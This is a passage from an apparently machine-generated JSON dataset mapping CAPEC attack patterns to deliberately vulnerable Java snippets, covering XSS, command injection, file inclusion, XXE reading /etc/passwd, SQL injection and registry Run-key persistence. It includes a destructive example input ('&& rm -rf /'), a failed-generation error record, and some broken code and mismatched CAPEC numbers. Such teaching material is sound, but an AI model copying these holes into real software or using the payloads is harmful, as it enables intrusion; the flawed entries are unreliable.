        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        \n        // Improper neutralization of invalid characters\n        if (userInput != null && userInput.contains(\"\\0\")) {\n            userInput = userInput.split(\"\\0\")[0];\n        }\n        \n        // Improper neutralization of script-related HTML tags\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is improperly sanitized, allowing for XSS attacks. The code attempts to filter out null characters (\\0) but does so incorrectly by only considering the part of the input before the null character. This can allow an attacker to inject malicious scripts after the null character, which will be processed and rendered by the browser. Additionally, the code does not properly neutralize special characters like '<' and '>', making it susceptible to basic XSS attacks. This snippet embodies the main idea of CAPEC-86 by showing how invalid characters can be used to bypass input filtering, leading to XSS vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        String command = \"ls \" + userInput;\n\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program takes a single command-line argument from the user and appends it to the 'ls' command. It then executes this command using the Runtime.getRuntime().exec() method. The user input is not sanitized or validated, allowing an attacker to inject arbitrary commands. For example, if the user input is '&& rm -rf /', the constructed command would be 'ls && rm -rf /', which could lead to severe consequences. This snippet embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, highlighting the risks of improper neutralization of special elements and argument delimiters in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class TerminalInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TerminalInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        try {\n            // Vulnerable to command injection\n            String command = \"/bin/sh -c \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability to command injection (CWE-77, CWE-78) by constructing an OS command using user input without proper neutralization of special elements. The program takes a single command-line argument from the user and executes it using the `/bin/sh -c` shell command. This allows an attacker to inject arbitrary commands, potentially leading to unauthorized actions on the system. The code represents the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper handling of user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Failed to parse CodeSnippet from completion {\"code_snippet\": \"import javax.xml.xpath.XPathExpressionException;\\nimport javax.xml.xpath.XPathFactory;\\nimport javax.xml.xpath.XPath;\\nimport org.w3c.dom.Document;\\nimport javax.xml.parsers.DocumentBuilderFactory;\\nimport javax.xml.parsers.DocumentBuilder;\\nimport java.io.StringReader;\\nimport javax.xml.transform.stream.StreamSource;\\n\\npublic class XMLInjectionExample {\\n    public static void main(String[] args) {\\n        String userInput = \\\"' or '1'='1\\\"; // Malicious input\\n        String xmlData = \\\"<users><user><username>admin</username><password>admin</password></user></users>\\\";\\n\\n        try {\\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\\n            DocumentBuilder builder = factory.newDocumentBuilder();\\n            Document doc = builder.parse(new InputSource(new StringReader(xmlData)));\\n\\n            XPathFactory xPathFactory = XPathFactory.newInstance();\\n            XPath xPath = xPathFactory.newXPath();\\n            String expression = \\\"/users/user[username/text()='\"}. Got: 1 validation error for CodeSnippet\ndescription\n  field required (type=value_error.missing)"
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class LocalCodeInclusion {\n    private static String configFilePath = \"config.properties\";\n\n    public static void main(String[] args) {\n        Properties properties = new Properties();\n        try (InputStream input = new FileInputStream(configFilePath)) {\n            properties.load(input);\n            String libraryPath = properties.getProperty(\"library.path\");\n            loadLibrary(libraryPath);\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    public static void loadLibrary(String path) {\n        try {\n            File file = new File(path);\n            if (file.exists()) {\n                Runtime.getRuntime().exec(\"java -jar \" + path);\n            } else {\n                System.out.println(\"Library not found.\");\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Local Code Inclusion vulnerability. The application reads a configuration file to get the path of a library and then attempts to load and execute it. This embodies the CAPEC concept by allowing an attacker to specify an arbitrary local file to be executed, potentially leading to the execution of malicious code. The code also reflects CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by loading a library from a path specified in an external configuration file, CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly validating the library path, and CWE-506 (Embedded Malicious Code) by potentially executing malicious code if the specified library is compromised."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class LocalFileInclusionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        if (filePath != null) {\n            File file = new File(filePath);\n            if (file.exists() && file.isFile()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found or is not a file.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a local file inclusion vulnerability. The servlet reads a file path from a request parameter and attempts to read and output the contents of the specified file. This code is vulnerable because it does not properly validate or sanitize the input file path, allowing an attacker to specify arbitrary files on the server. This can lead to the inclusion and execution of unintended files, potentially exposing sensitive information or enabling further attacks. The code embodies the main idea of CAPEC-152 (PHP Local File Inclusion) and is related to CWE-829, CWE-98, CWE-646, CWE-616, and CWE-473, as it improperly handles external input and relies on file names without adequate validation."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.URL;\nimport java.net.URLConnection;\n\npublic class RemoteCodeInclusion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            String remoteUrl = \"http://example.com/maliciousCode.js\";\n            URL url = new URL(remoteUrl);\n            URLConnection connection = url.openConnection();\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder code = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                code.append(inputLine).append(\"\\n\");\n            }\n            in.close();\n\n            // Simulate execution of the downloaded code\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            executeCode(code.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void executeCode(String code) {\n        // This is a placeholder for executing the downloaded code\n        // In a real scenario, this could be a JavaScript engine or similar\n        System.out.println(\"Executing code: \" + code);\n    }\n}",
        "description": "This Java code snippet demonstrates a Remote Code Inclusion vulnerability. The code downloads a JavaScript file from a remote URL without performing any integrity checks (CWE-494). It then simulates the execution of the downloaded code, which represents the inclusion of functionality from an untrusted control sphere (CWE-829). This example highlights the risks associated with loading and executing code from untrusted sources, which can lead to the execution of malicious code and compromise the security of the application."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xml = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                     \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                     \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xml)));\n\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability. The XML input contains a Document Type Definition (DTD) that defines an external entity 'xxe' which references the local file '/etc/passwd'. The code does not properly restrict the use of DTDs and external entities, allowing an attacker to inject malicious DTDs. This can lead to sensitive information exposure, such as reading local files. The code sets some security features but deliberately leaves them insufficient to highlight the vulnerability. This example embodies the main idea of CAPEC-228 and related CWEs, particularly CWE-827 and CWE-776."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import javax.xml.soap.*;\n\npublic class SOAPArrayOverflowExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate a SOAP message with an array\n        String soapMessage = \"<SOAP-ENV:Envelope xmlns:SOAP-ENV=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><SOAP-ENV:Body><Array><Item>1</Item><Item>2</Item><Item>3</Item></Array></SOAP-ENV:Body></SOAP-ENV:Envelope>\";\n        MessageFactory messageFactory = MessageFactory.newInstance();\n        SOAPMessage message = messageFactory.createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n\n        // Extract the array from the SOAP message\n        SOAPBody body = message.getSOAPBody();\n        NodeList items = body.getElementsByTagName(\"Item\");\n\n        // Vulnerable code: trusting the specified size (3) but processing more items\n        int specifiedSize = 3; // This should be dynamically determined from the message\n        String[] array = new String[specifiedSize];\n\n        for (int i = 0; i < items.getLength(); i++) {\n            // Potential buffer overflow if items.getLength() > specifiedSize\n            array[i] = items.item(i).getTextContent();\n        }\n\n        // Print the array contents\n        for (String item : array) {\n            System.out.println(item);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Overflow vulnerability. The code processes a SOAP message containing an array of items. It naively trusts a specified size (3) for the array but does not verify if the actual number of items in the SOAP message exceeds this size. If the number of items in the message is greater than the specified size, the code attempts to access memory outside the bounds of the allocated array, leading to a potential buffer overflow. This example embodies the main idea of CAPEC-220 (SOAP Array Overflow) and is related to several CWEs, including CWE-805, CWE-130, CWE-806, CWE-120, and CWE-122."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class TransactionLogger {\n    private Map<String, String> transactions = new HashMap<>();\n\n    public void addTransaction(String transactionId, String data) {\n        transactions.put(transactionId, data);\n        logTransaction(transactionId, data);\n    }\n\n    private void logTransaction(String transactionId, String data) {\n        try (FileWriter writer = new FileWriter(\"transaction.log\", true)) {\n            writer.write(\"Transaction ID: \" + transactionId + \", Data: \" + data + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        TransactionLogger logger = new TransactionLogger();\n        logger.addTransaction(\"12345\", \"Sensitive Data\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a transaction logging system. The `TransactionLogger` class stores transaction data in a HashMap and logs each transaction to a file named `transaction.log`. The `logTransaction` method writes transaction details, including sensitive data, directly to the log file without any encryption or access control. This represents the deprecated CAPEC 'Abuse of Transaction Data Structure' and related CWEs, such as CWE-532 (Information Exposure Through Log Files) and CWE-287 (Authentication Bypass Issues). The code is vulnerable to information exposure and potential unauthorized access to sensitive transaction data."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdateClient {\n    public static void main(String[] args) throws IOException {\n        String serverAddress = \"http://example.com/update\";\n        URL url = new URL(serverAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // Vulnerable: No server-side authentication, relying on client-side only\n        String clientAuthToken = \"client-auth-token\";\n        connection.setRequestProperty(\"Authorization\", clientAuthToken);\n\n        InputStream inputStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        reader.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable client application that fetches updates from a server. The main vulnerability here is the reliance on client-side authentication (CWE-603), where the client sends an authentication token to the server without any server-side verification. This makes it possible for an attacker to sniff the network traffic, capture the token, and replay it to the server to bypass authentication (CWE-294). The code also lacks proper encryption for the data transmission, making it susceptible to passive sniffing attacks as described in the deprecated CAPEC. This example highlights the importance of implementing robust server-side authentication and using secure communication channels."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerablePatchUpdater {\n    public static void main(String[] args) throws IOException {\n        String serverAddress = \"http://example.com/patch\";\n        URL url = new URL(serverAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // Vulnerable: No server-side authentication, relying on client-side only\n        String clientAuthToken = \"client-side-auth-token\";\n        connection.setRequestProperty(\"Authorization\", clientAuthToken);\n\n        InputStream inputStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        reader.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable patch updater that fetches updates from a server. The vulnerability lies in the use of client-side authentication (CWE-603), where the client sends an authentication token without any server-side verification. This makes it possible for an attacker to sniff the network traffic (CAPEC-65) and capture the authentication token. The attacker can then replay the captured token (CWE-294) to bypass authentication and gain unauthorized access to the patch data. The code also lacks proper error handling and secure communication practices, further exposing it to potential attacks."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started...\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\"); // Client-side authentication\n            }\n\n            // Simulate sending application code\n            out.println(\"Here is the application code...\");\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that performs client-side authentication and sends application code to the client. The server listens on port 8080 and spawns a new thread for each client connection. The client sends an 'AUTHENTICATE' message, and the server responds with 'AUTH_SUCCESS' without any real authentication check, embodying CWE-603 (Use of Client-Side Authentication). The server then sends the application code to the client. This setup is vulnerable to sniffing attacks (CAPEC-65) where an attacker can capture and replay the authentication message (CWE-294) to gain unauthorized access to the application code."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableFuzzingExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input for SQL Injection\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\") + \", Password: \" + resultSet.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace(); // Potential exposure of sensitive information\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a SQL query that is susceptible to SQL Injection attacks. The user input is directly concatenated into the SQL query without proper validation or sanitization, allowing an attacker to manipulate the query logic. The code also prints out sensitive information (username and password) if the query is successful. Additionally, if an SQL exception occurs, the stack trace is printed, potentially exposing sensitive information about the database and the environment. This example embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive information beyond what is intended."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableFileProcessor {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableFileProcessor <file_path>\");\n            return;\n        }\n\n        String filePath = args[0];\n        File file = new File(filePath);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (!file.getName().endsWith(\".txt\")) {\n            System.out.println(\"Invalid file type. Only .txt files are allowed.\");\n            return;\n        }\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Process the file line by line\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            System.out.println(\"Error reading the file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file processing application. The application takes a file path as an argument and attempts to read and process the file. The code is vulnerable to several issues described in the CAPEC and related CWEs:\n\n1. **CAPEC-160: Force Use of Corrupted Files**: The application can be forced to process a corrupted file, potentially leading to denial of service or other unintended behaviors.\n2. **CWE-646: Reliance on File Name or Extension of Externally-Supplied File**: The application relies on the file extension to determine if the file is valid, which can be easily bypassed by an attacker.\n3. **CWE-829: Inclusion of Functionality from Untrusted Control Sphere**: The application reads and processes files from an untrusted source without proper validation.\n4. **CWE-434: Unrestricted Upload of File with Dangerous Type**: The application does not properly restrict the types of files that can be processed, allowing potentially dangerous files to be read.\n\nThe code represents the main idea of the CAPEC by showing how an application can be forced to use a corrupted file, leading to various security issues."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import java.util.Map;\n\npublic class VulnerableCode {\n    // CWE-1108: Excessive Reliance on Global Variables\n    private static String configPath = System.getenv(\"CONFIG_PATH\");\n\n    public static void main(String[] args) {\n        // CWE-1106: Insufficient Use of Symbolic Constants\n        String defaultConfigPath = \"/etc/default/config\";\n\n        // CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\n        String config;\n\n        if (configPath != null) {\n            config = configPath;\n        } else {\n            config = defaultConfigPath;\n        }\n\n        // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        try {\n            Runtime.getRuntime().exec(\"sh -c \" + config);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that embodies the main idea of CAPEC-13: Subverting Environment Variable Values. The code retrieves an environment variable 'CONFIG_PATH' and uses it to execute a shell command without proper validation or neutralization, leading to potential command injection (CWE-95). Additionally, the code suffers from several other weaknesses: it relies excessively on global variables (CWE-1108), uses literal constants instead of symbolic constants (CWE-1106), declares variables with unnecessarily wide scope (CWE-1126), and does not centralize symbolic constant definitions (CWE-1107). This combination of issues makes the code highly susceptible to various attacks and maintenance problems."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class VulnerableCode {\n    // Global variable\n    public static String userInput;\n\n    public static void main(String[] args) {\n        // Simulate user input\n        userInput = args[0];\n        processInput();\n    }\n\n    public static void processInput() {\n        // Improper control of dynamically-identified variable\n        String dynamicVarName = \"user\" + userInput;\n        String value = getDynamicValue(dynamicVarName);\n        System.out.println(\"Processed value: \" + value);\n    }\n\n    public static String getDynamicValue(String varName) {\n        // Simulate dynamic variable evaluation\n        if (varName.equals(\"userAdmin\")) {\n            return \"Admin Access\";\n        } else if (varName.equals(\"userGuest\")) {\n            return \"Guest Access\";\n        } else {\n            return \"Unknown User\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to global variable manipulation and improper control of dynamically-identified variables. The global variable 'userInput' is set based on user input, which is then used to dynamically construct a variable name in the 'processInput' method. This dynamic variable evaluation can lead to security issues, as an attacker could manipulate 'userInput' to access or modify unintended variables or functions. The code also shows excessive reliance on global variables and the declaration of a variable with unnecessarily wide scope, making it more susceptible to attacks."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class CanonicalizationExample {\n    public static void main(String[] args) {\n        String userInput = \"..\\..\\etc\\passwd\";\n        if (isValidPath(userInput)) {\n            String canonicalPath = canonicalize(userInput);\n            System.out.println(\"Canonical Path: \" + canonicalPath);\n        } else {\n            System.out.println(\"Invalid Path\");\n        }\n    }\n\n    public static boolean isValidPath(String path) {\n        // Validate the path before canonicalization (Incorrect Behavior Order)\n        String regex = \"^[a-zA-Z0-9_/]+$\";\n        return Pattern.matches(regex, path);\n    }\n\n    public static String canonicalize(String path) {\n        // Simulate canonicalization\n        return path.replace(\"..\", \"\").replace(\"\\\\\", \"/\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the deprecated CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'. The code first validates the user input path using a regex pattern before canonicalizing it. This is problematic because the validation step occurs before canonicalization, potentially allowing malicious input to bypass validation and become harmful after canonicalization. The canonicalize method then attempts to sanitize the path by removing '..' and replacing backslashes with forward slashes. This example highlights the importance of proper order in validation and canonicalization to prevent security issues."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\nimport java.util.Base64;\n\npublic class VulnerableFileHandler {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableFileHandler <encodedFilePath>\");\n            return;\n        }\n\n        String encodedFilePath = args[0];\n        try {\n            // CWE-173: Improper Handling of Alternate Encoding\n            String decodedFilePath = new String(Base64.getDecoder().decode(encodedFilePath));\n\n            // CWE-73: External Control of File Name or Path\n            File file = new File(decodedFilePath);\n\n            // CWE-20: Improper Input Validation\n            if (!file.exists()) {\n                System.out.println(\"File does not exist.\");\n                return;\n            }\n\n            // CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component\n            String content = new String(Files.readAllBytes(file.toPath()));\n            System.out.println(\"File content: \" + content);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file handling process that embodies the main idea of CAPEC-170: Leverage Alternate Encoding. The code takes a Base64-encoded file path as input, decodes it, and then attempts to read and print the file's content. The vulnerabilities present in the code include:\n\n1. CWE-173: Improper Handling of Alternate Encoding - The code decodes the Base64-encoded file path without proper validation.\n2. CWE-73: External Control of File Name or Path - The decoded file path is directly used to create a File object, allowing potential path traversal attacks.\n3. CWE-20: Improper Input Validation - The code does not adequately validate the decoded file path.\n4. CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component - The file content is read and printed without proper sanitization, which could lead to injection attacks.\n\nThis code snippet highlights the risks associated with improper handling of alternate encodings and the importance of validating and sanitizing inputs at every stage of processing."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class LogManipulationExample {\n    private static final Logger logger = Logger.getLogger(LogManipulationExample.class.getName());\n    private static final String LOG_FILE = \"application.log\";\n\n    public static void main(String[] args) {\n        try {\n            // Simulate logging sensitive information\n            logSensitiveInfo(\"User password: 12345\");\n\n            // Simulate log manipulation\n            manipulateLog(\"User password: 12345\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred\", e);\n        }\n    }\n\n    private static void logSensitiveInfo(String info) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(info + \"\\n\");\n        }\n    }\n\n    private static void manipulateLog(String fakeEntry) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(fakeEntry + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can manipulate audit logs. The `logSensitiveInfo` method logs sensitive information (CWE-532) without proper neutralization (CWE-117). The `manipulateLog` method simulates an attacker adding a fake log entry to cover their tracks, exploiting insufficient access controls on the log file (CAPEC-117). This example highlights the risks of improper log handling, including the insertion of sensitive information and the potential for log manipulation."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        Preferences prefs = Preferences.userRoot().node(\"/com/example/app\");\n        // CWE-314: Storing sensitive information in cleartext in the registry\n        prefs.put(\"password\", \"mySecretPassword\");\n        System.out.println(\"Password stored in registry.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable practice related to the deprecated CAPEC pattern 'Registry Manipulation' and CWE-314 'Cleartext Storage in the Registry'. The code uses the Preferences API to store a sensitive piece of information (a password) in cleartext within the registry. This practice is insecure as it exposes sensitive data to potential unauthorized access. The main idea represented here is the improper handling and storage of sensitive information in the registry, which can lead to security vulnerabilities."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryRunKeyModifier {\n    public static void main(String[] args) {\n        // Obtain the user preferences node for the package\n        Preferences prefs = Preferences.userRoot().node(\"com.example\");\n\n        // Add a new entry to the run key\n        prefs.put(\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MyMaliciousApp\", \"C:\\\\path\\\\to\\\\malicious.exe\");\n\n        // Store sensitive information in cleartext (CWE-314)\n        prefs.put(\"SensitiveInfo\", \"password123\");\n\n        System.out.println(\"Registry run key modified and sensitive information stored.\");\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might modify the Windows registry to add a new entry to the 'run keys', ensuring that a malicious application is executed when a user logs in. The code uses the Preferences API to interact with the registry, adding a new run key entry that points to a malicious executable. Additionally, it stores sensitive information in cleartext within the registry, highlighting CWE-314. This snippet embodies the main idea of CAPEC-15 by showing how an attacker can achieve persistence on a target system through registry modification."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class SchemaPoisoningExample {\n    public static void main(String[] args) {\n        String schemaPath = \"config/schema.xml\";\n        String maliciousSchema = \"<schema><element name='user' type='string'/><element name='password' type='string'/></schema>\";\n\n        // CWE-15: External Control of System or Configuration Setting\n        if (args.length > 0) {\n            schemaPath = args[0];\n        }\n\n        try {\n            // CWE-501: Trust Boundary Violation\n            String originalSchema = new String(Files.readAllBytes(Paths.get(schemaPath)));\n            System.out.println(\"Original Schema: \" + originalSchema);\n\n            // CWE-506: Embedded Malicious Code\n            FileWriter writer = new FileWriter(new File(schemaPath));\n            writer.write(maliciousSchema);\n            writer.close();\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Schema has been modified to: \" + maliciousSchema);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a schema poisoning attack. The code allows an external user to specify the path to a schema file (CWE-15: External Control of System or Configuration Setting). It reads the original schema and prints it (CWE-501: Trust Boundary Violation), then overwrites the schema with a malicious one (CWE-506: Embedded Malicious Code). Finally, it prints the modified schema, exposing sensitive system information (CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere). This example highlights how an adversary can corrupt or modify a schema to undermine the security of an application."
    },
    {
        "capec_id": "272",
